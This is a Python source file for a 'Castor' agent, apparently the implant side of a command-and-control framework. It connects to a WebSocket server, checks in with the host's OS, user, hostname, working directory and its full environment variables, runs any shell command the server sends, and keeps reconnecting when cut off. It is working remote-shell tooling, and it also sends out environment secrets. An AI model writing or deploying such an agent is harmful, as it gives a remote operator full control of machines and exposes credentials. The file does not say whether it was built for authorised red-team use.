"""Agent that connects to a WebSocket server, receives OS commands,
executes them, and returns the output."""
import asyncio
import json
import os
import getpass
import time
import platform
import subprocess
import sys
import websockets
from loguru import logger
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Global variables
SERVER_IP = None
SERVER_PORT = None
JOB_QUEUE = None


def get_os():
    """Get the OS name and version."""
    return platform.platform()


def get_user():
    """Get the username."""
    return getpass.getuser()


def get_hostname():
    """Get the hostname."""
    return platform.node()


def get_cwd():
    """Get the current working directory."""
    return os.getcwd()


def get_env():
    """Get the environment variables."""
    # Convert the environment variables to a string
    return str(os.environ)


def get_path():
    """Get the PATH environment variable."""
    return os.getenv("PATH")


async def execute_command(command):
    """Execute a command using asyncio and return the output."""
    try:
        output = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE)
        output = await output.communicate()
        output = b"".join(output)
    except subprocess.CalledProcessError as error:
        output = error.output
    except Exception as error: # pylint: disable=broad-except
        output = str(error).encode("utf-8")
    return output


def get_agent_info() -> dict:
    """Get the agent information."""
    agent_info = {
        "os": get_os(),
        "user": get_user(),
        "hostname": get_hostname(),
        "cwd": get_cwd(),
        "env": get_env(),
        "path": get_path()
    }
    return agent_info


async def process_message(message: dict) -> str:
    """Process the message and return the output."""
    if message["type"] == "job":
        command_output = await execute_command(message["data"]["command"])
        command_output = command_output.decode("utf-8")
        output = {"_id": message["data"]["_id"],
                  "output": command_output, "status": "completed"}
    elif message["type"] == "info":
        output = get_agent_info()
    else:
        output = "Unknown message type"
    return output


async def handle_jobs():
    """Handle the jobs in the queue."""
    global JOB_QUEUE
    JOB_QUEUE = asyncio.Queue()
    while True:
        # Get job from queue
        queue_message = await JOB_QUEUE.get()
        job = queue_message["message"]
        websocket = queue_message["websocket"]
        logger.debug(f"Processing job: {job}")
        # Process job
        output = await process_message(job)
        logger.debug(f"Job processed: {output}")
        # Send output to server
        output_message = {"type": "output", "data": output}
        await websocket.send(json.dumps(output_message))
        # Mark job as done
        JOB_QUEUE.task_done()
        logger.debug("Job marked as done")
        await websocket.send(json.dumps({"type": "status", "data": "ready"}))


async def receive_messages():
    """Receive messages from the server."""
    while True:
        try:
            async with websockets.connect(f"ws://{SERVER_IP}:{SERVER_PORT}") as websocket:
                logger.success(f"Connected to {SERVER_IP}:{SERVER_PORT}")
                # Check in by sending agent information
                agent_info = get_agent_info()
                logger.info("Sending agent information")
                await websocket.send(json.dumps({"type": "checkin", "data": agent_info}))
                logger.debug("Agent information sent")
                # Wait for commands
                await websocket.send(json.dumps({"type": "status", "data": "ready"}))
                while True:
                    logger.debug("Waiting for messages...")
                    message = await websocket.recv()
                    message = json.loads(message)
                    logger.debug(f"Received message: {message}")
                    # Add message to queue
                    queue_message = {
                        "websocket": websocket, "message": message}
                    await JOB_QUEUE.put(queue_message)
                    logger.debug("Message added to queue")

        except ConnectionRefusedError:
            logger.error(
                f"Connection to {SERVER_IP}:{SERVER_PORT} refused... Retrying in 5 seconds")
            # Retry connection after 5 seconds
            time.sleep(5)

        except websockets.exceptions.ConnectionClosedError:
            # Retry connection after 5 seconds
            logger.error(
                f"Connection to {SERVER_IP}:{SERVER_PORT} closed... Retrying in 5 seconds")
            time.sleep(5)

        except websockets.exceptions.ConnectionClosedOK:
            # Retry connection after 5 seconds
            logger.error(
                f"Connection to {SERVER_IP}:{SERVER_PORT} closed... Retrying in 5 seconds")
            time.sleep(5)

        except websockets.exceptions.InvalidMessage:
            logger.error(
                f"Invalid message received from {SERVER_IP}:{SERVER_PORT}... Retrying in 5 seconds")
            # Retry connection after 5 seconds
            time.sleep(5)

        except KeyboardInterrupt:
            logger.info("Exiting...")
            sys.exit(0)


def get_server_info():
    """Get the server information."""
    # Get server IP and port from command line arguments, if any
    # If there aren't any, use the environment variables
    try:
        if len(sys.argv) == 1:
            ip = os.getenv("SERVER_IP")
            port = os.getenv("SERVER_PORT")
        else:
            ip = sys.argv[1]
            port = sys.argv[2]
        # Check if IP and port are valid
        if not ip or not port:
            raise IndexError
    except IndexError:
        logger.error("Please provide the server IP and port")
        sys.exit(1)
    return ip, port


@logger.catch
async def main():
    """Main loop."""
    # Start the job handler
    asyncio.create_task(handle_jobs())
    # Start the message receiver
    await receive_messages()

if __name__ == "__main__":

    # Get server information
    SERVER_IP, SERVER_PORT = get_server_info()

    # Configure logger
    logger.info("Starting Castor agent...")
    logger.info(f"Connecting to {SERVER_IP}:{SERVER_PORT}...")

    asyncio.run(main())
